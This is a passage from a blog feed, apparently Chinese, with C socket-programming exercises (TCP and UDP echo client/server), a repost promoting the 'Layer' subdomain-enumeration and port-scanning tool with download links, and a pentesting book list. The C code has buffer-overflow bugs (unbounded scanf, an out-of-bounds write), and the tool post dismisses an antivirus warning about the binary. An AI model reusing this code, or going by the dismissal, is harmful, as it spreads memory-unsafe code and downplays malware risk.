server.sin_port=htons(PORT);</div><div class="line">    server.sin_addr=*((struct in_addr *)he-&gt;h_addr);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(connect(sockfd,(struct sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"connect() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ((recv(sockfd,wel_msg,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"[!] Receive welcome message fail."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    wel_msg[<span class="keyword">sizeof</span>(wel_msg)]=<span class="string">'\0'</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, wel_msg);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Input client name:"</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,cli_name);</div><div class="line">    <span class="keyword">if</span>((send_num=send(sockfd,cli_name,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"send() error."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[*] Input string:"</span>);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,send_buf);</div><div class="line">        send_buf[<span class="built_in">strlen</span>(send_buf)]=<span class="string">'\0'</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((send_num=send(sockfd,send_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"send() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((recv_num=recv(sockfd,recv_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"recv() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[&gt;] Received reverse string:%s\n"</span>,recv_buf);</div><div class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(recv_buf,<span class="string">"tiuq"</span>))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    close(sockfd);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-演示"><a href="#0x02-演示" class="headerlink" title="0x02 演示"></a>0x02 演示</h2><p><strong>服务端</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/2495541052.gif" alt="多进程服务端.gif"></p><p><strong>客服端1</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/1706792713.gif" alt="客户端1.gif"></p><p><strong>客户端2</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/4082334739.gif" alt="客户端2.gif"></p><h2 id="0x03-心得"><a href="#0x03-心得" class="headerlink" title="0x03 心得"></a>0x03 心得</h2><p>注意fork函数的用法：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">pid_t</span> pid;</div><div class="line"><span class="keyword">if</span>((pid=fork())&gt;<span class="number">0</span>)<span class="comment">/*产生子进程*/</span></div><div class="line">&#123;    <span class="comment">/*父进程处理过程，父进程关闭父进程的已连接套接字描述符，跳出while循环继续侦听下一个客户的请求*/</span></div><div class="line">    close(connfd);</div><div class="line">    <span class="keyword">continue</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)</div><div class="line">&#123;    <span class="comment">/*子进程处理过程，子进程关闭子进程的套接字描述符，调用子进程处理函数pro_cli函数*/</span></div><div class="line">    close(listenfd);</div><div class="line">    pro_cli(connfd,client);<span class="comment">/*传入子进程的已连接socket描述符和客户端的套接字地址结构*/</span></div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">/*子进程必须调用exit函数结束退出*/</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;    <span class="comment">/*fork函数调用失败结束处理*/</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fork() failed."</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 学习记录 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> socket programming </tag>
            
            <tag> c </tag>
            
            <tag> socket编程练习 </tag>
            
            <tag> c语言 </tag>
            
            <tag> multi process server </tag>
            
            <tag> 多进程服务器 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux平台C语言Socket编程练习之UDP套接字]]></title>
      <url>/2016/11/24/Linux%E5%B9%B3%E5%8F%B0C%E8%AF%AD%E8%A8%80Socket%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0%E4%B9%8BUDP%E5%A5%97%E6%8E%A5%E5%AD%97/</url>
      <content type="html"><![CDATA[<h2 id="0x00-要求"><a href="#0x00-要求" class="headerlink" title="0x00 要求"></a>0x00 要求</h2><p>实现一个基于UDP协议的服务器-客户端程序，要求完成以下功能:</p><p><strong>服务端</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">接收客户的连接请求，并发送欢迎信息，显示客户的IP地址和端口号；</div><div class="line"> </div><div class="line">循环接收接收客户传来的字符串，反转后传递给客户；</div></pre></td></tr></table></figure><p><strong>客户端</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">从命令行读入服务器的IP地址；并连接到服务器；</div><div class="line"> </div><div class="line">循环从命令行读入一行字符串，并传递给服务器，由服务器对字符串反转，并将结果返回客户程序，如果用户输入的是quit，则关闭连接；</div><div class="line"> </div><div class="line">客户程序显示反转后的字符串；</div></pre></td></tr></table></figure><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><a id="more"></a><p><strong>服务端</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 1234</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXDATASIZE 100</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> sockfd;</div><div class="line">    <span class="keyword">socklen_t</span> client_len;</div><div class="line">    <span class="keyword">ssize_t</span> recv_num,send_num;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client</span>;</span></div><div class="line">    <span class="keyword">char</span> recv_buf[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> send_buf[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> response[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> wel_msg[]=<span class="string">"[!] Welcome,I can return your input,you can input 'quit' to exit:)"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((sockfd = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"socket() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    bzero(&amp;server,<span class="keyword">sizeof</span>(server));</div><div class="line">    server.sin_family=AF_INET;</div><div class="line">    server.sin_port=htons(PORT);</div><div class="line">    server.sin_addr.s_addr=htonl(INADDR_ANY);</div><div class="line"></div><div class="line">    client_len=<span class="keyword">sizeof</span>(client);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((bind(sockfd,(struct sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server)))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"bind() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((recvfrom(sockfd,response,MAXDATASIZE,<span class="number">0</span>,(struct sockaddr *)&amp;client,&amp;client_len))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"recvfrom() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[!] You got a connection: message &lt;%s&gt; client ip &lt;%s&gt; port &lt;%d&gt;\n"</span>,response,inet_ntoa(client.sin_addr),ntohs(client.sin_port));</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span>((sendto(sockfd,wel_msg,<span class="keyword">sizeof</span>(wel_msg),<span class="number">0</span>,(<span class="keyword">const</span> struct sockaddr *)&amp;client,client_len))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"sendto() failed"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>((recv_num=recvfrom(sockfd,recv_buf,MAXDATASIZE,<span class="number">0</span>,(struct sockaddr *)&amp;client,&amp;client_len))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"recvfrom() failed."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        recv_buf[recv_num]=<span class="string">'\0'</span>;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[&gt;] Receive client inputed string:%s\n"</span>,recv_buf);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[*] Return client inputed string:%s\n"</span>,recv_buf);</div><div class="line"></div><div class="line">        <span class="built_in">strcpy</span>(send_buf,recv_buf);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((send_num=(sendto(sockfd,send_buf,<span class="keyword">sizeof</span>(send_buf),<span class="number">0</span>,(struct sockaddr *)&amp;client,client_len)))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"sendto() failed"</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(recv_buf,<span class="string">"quit"</span>))</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"[!] Client request to exit.\n"</span>);</div><div class="line">            close(sockfd);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    close(sockfd);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>客户端</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 1234</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXDATASIZE 100</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> sockfd;</div><div class="line">    <span class="keyword">ssize_t</span> recv_num,send_num;</div><div class="line">    <span class="keyword">socklen_t</span> server_len;</div><div class="line">    <span class="keyword">char</span> recv_buf[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> send_buf[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> request[]=<span class="string">"hello"</span>;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">remote_host</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Usage:%s &lt;IP Address&gt;\n"</span>,argv[<span class="number">0</span>]);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((remote_host=gethostbyname(argv[<span class="number">1</span>]))==<span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"gethostbyname() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((sockfd=socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"socket() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    bzero(&amp;server,<span class="keyword">sizeof</span>(server));</div><div class="line">    server.sin_family=AF_INET;</div><div class="line">    server.sin_port=htons(PORT);</div><div class="line">    server.sin_addr=*((struct in_addr *)remote_host-&gt;h_addr);</div><div class="line">    server_len=<span class="keyword">sizeof</span>(server);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(sendto(sockfd,request,<span class="keyword">sizeof</span>(request),<span class="number">0</span>,(struct sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"sendto() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((recv_num=recvfrom(sockfd,recv_buf,MAXDATASIZE,<span class="number">0</span>,(struct sockaddr*)&amp;server,&amp;server_len))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"recvfrom() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,recv_buf);</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[*] Please input ASCII string:"</span>);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,send_buf);</div><div class="line">        send_buf[<span class="built_in">strlen</span>(send_buf)]=<span class="string">'\0'</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((send_num=sendto(sockfd,send_buf,<span class="built_in">strlen</span>(send_buf),<span class="number">0</span>,(struct sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server)))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"sendto() failed."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((recv_num=recvfrom(sockfd,recv_buf,MAXDATASIZE,<span class="number">0</span>,(struct sockaddr*)&amp;server,&amp;server_len))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"recvfrom() failed."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[&gt;] Server return string:%s\n"</span>,recv_buf);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(recv_buf,<span class="string">"quit"</span>))</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"[!] You inputed 'quit' to exit.\n"</span>);</div><div class="line">            close(sockfd);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    close(sockfd);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-演示"><a href="#0x02-演示" class="headerlink" title="0x02 演示"></a>0x02 演示</h2><p><strong>服务端</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/4143645139.gif" alt="UDP 服务端.gif"></p><p><strong>客服端</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/3865009782.gif" alt="UDP 客户端.gif"></p><h2 id="0x03-心得"><a href="#0x03-心得" class="headerlink" title="0x03 心得"></a>0x03 心得</h2><p>UDP使用recvfrom函数接收数据，使用sendto函数发送数据，注意它们的传输的参数。</p>]]></content>
      
        <categories>
            
            <category> 学习记录 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> socket programming </tag>
            
            <tag> c </tag>
            
            <tag> socket编程练习 </tag>
            
            <tag> c语言 </tag>
            
            <tag> udp socket </tag>
            
            <tag> udp套接字 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[实用工具：Layer 子域名挖掘机4.1 全新重构+175万大字典]]></title>
      <url>/2016/11/16/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%EF%BC%9ALayer-%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98%E6%9C%BA4.1-%E5%85%A8%E6%96%B0%E9%87%8D%E6%9E%84+175%E4%B8%87%E5%A4%A7%E5%AD%97%E5%85%B8/</url>
      <content type="html"><![CDATA[<p>经常看到有文章推荐用这个子域名挖掘的小工具，但之前都没好好写，代码很乱，效率也不高，有时候还经常崩溃，既然大家这么喜欢用，那干脆今晚抽了点时间全部重写了下，新版更稳定，也加入了更实用的端口探测功能，可以在挖掘子域名的同时扫描端口。<br>优化详情：<br>1、新起项目，代码全部重写，性能更优更稳定。<br>2、增加子端口探测功能，方便渗透测试。<br>3、增加DNS服务器切换和自定义，目前测试DNSPOD最快，个人测试最快达到了每秒3000+条验证，速度比上个版本增加5–10倍（速度会越跑越快）。<br>切换DNS服务器也可以避免进行大量DNS查询的时候影响正常上网。<br>4、对字典权重进行了调整，更容易命中的排在更前。<br>5、增加升级提醒，如果还有下个版本的话，会有提醒。<br>特别提醒：基于.NET4.5编译，得安装.NET4.5才能用 ^_^<br>程序下载地址：<a href="https://pan.baidu.com/s/1dE4jgTr" target="_blank" rel="external">https://pan.baidu.com/s/1dE4jgTr</a> 密码: 9f5u<br>源码下载地址：<a href="https://pan.baidu.com/s/1qXURfzu" target="_blank" rel="external">https://pan.baidu.com/s/1qXURfzu</a><br>BTW：我也不知道360这个傻逼为什么会报窃取QQ密码的毒。</p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/3981309436.png" alt="Layer 子域名挖掘机4.1 全新重构+175万大字典.png"></p><p>来自法师Seay<a href="http://www.cnseay.com/4452/" target="_blank" rel="external">博客</a></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> layer </tag>
            
            <tag> layer 子域名挖掘机4.1 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[作为一个penetration tester必知必读的好书推荐]]></title>
      <url>/2016/11/10/%E4%BD%9C%E4%B8%BA%E4%B8%80%E4%B8%AApenetration-tester%E5%BF%85%E7%9F%A5%E5%BF%85%E8%AF%BB%E7%9A%84%E5%A5%BD%E4%B9%A6%E6%8E%A8%E8%8D%90/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>至于书籍推荐这个话题，很多前辈都回答过了，但还是有很多刚入门的小伙伴还是一言不合就问该看书籍，作为一个搞Web安全的菜鸟忠恳告诉你，你第一本该看的书是<a href="http://www.jianshu.com/p/60dd8e9cd12f" target="_blank" rel="external">《提问的智慧》</a>，附上一个脑图：</p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/1185507616.png" alt="提问的智慧.png"></p><p>既然是说Web安全相关的书籍，那么就不扯二进制安全方面，还是希望搞二进制的表哥专门来一份关于二进制安全的书单。在学Web安全前，你可能得先接触编程、协议和Linux等，至于它们的重要性就不用多说了，因为前辈和同行的小伙伴们都已经说地够多了。下面推荐的书籍并不说它们就是最优秀的，因为第一本来就没有最完美的说法，第二因为个人水平有限，视野狭窄，很多优秀有关Web安全书籍没有说到，所以请大家补充(本文所提到的大多都是中文或中文译版)，第三任何东西对每个人来说都不一样，最适合自己的才是最好的。另外下面提到的书籍并不是说你一定要读完，惭愧地说我个人也还没有全部读完，你完全可以根据自己的情况选读其中书籍，不过我个人还是推荐读完，因为它们的内容和质量都是受到大家认可和好评的，更何况多读点好书还是有好处的。<br>另外由于书籍版权问题，所以没有给出PDF链接，不过它们在网上大多都有PDF版本，如有所需，请君自取吧：P 有的给出链接是因为国内安全爱好者翻译的书籍但是在国内并没有正式出版。没给出书评和简介原因是因为网上已经有很多说明了，不想赘述，如若想看随便一搜便是。至于为什么推荐那么多关于Python的书籍呢，除了客观原因之外，主观原因是人生苦短，我用Python（逃ε=ε=ε=┏(゜ロ゜;)┛）。</p><h2 id="0x01-书籍"><a href="#0x01-书籍" class="headerlink" title="0x01 书籍"></a>0x01 书籍</h2><p>《信息安全标准和法律法规（第二版）》（注：武汉大学出版社）<br>《HTTP权威指南》<br>《HTML5权威指南》<br>《JavaScript权威指南（第6版）》<br>《TCP/IP详解卷1:协议》<br>《SQL编程基础(原书第3版)》<br>《PHP和MySQL Web开发(第四版)》<br>《PHP安全基础》<br>《PHP应用程序安全编程》<br>《高级PHP应用程序漏洞审核技术》<br>《精通正则表达式 (第3版) 》<br>《正则指引》<br>《鸟哥的Linux私房菜 基础学习篇 (第三版) 》<br>《Linux Shell脚本攻略》<br>《C Primer Plus（第6版）中文版》<br>《数据结构(C语言版)》（注：机械工业出版社）<br>《编译原理：原理、技术与工具》（注：机械工业出版社）<br>《C++ Primer Plus (第6版） 中文版》<br>《Python核心编程（第二版）》<br>《Python黑帽子:黑客与渗透测试编程之道》<br>《Python绝技:运用Python成为顶级黑客》<br>《精通黑客脚本》<br>《XSS跨站脚本攻击剖析与防御》<br><a href="https://github.com/caomulaodao/XSS-Filter-Evasion-Cheat-Sheet-CN" target="_blank" rel="external">《XSS Filter Evasion Cheat Sheet 中文版》</a><br><a href="http://www.nxadmin.com/web/924.html" target="_blank" rel="external">《Robust Defenses for Cross-Site Request Forgery 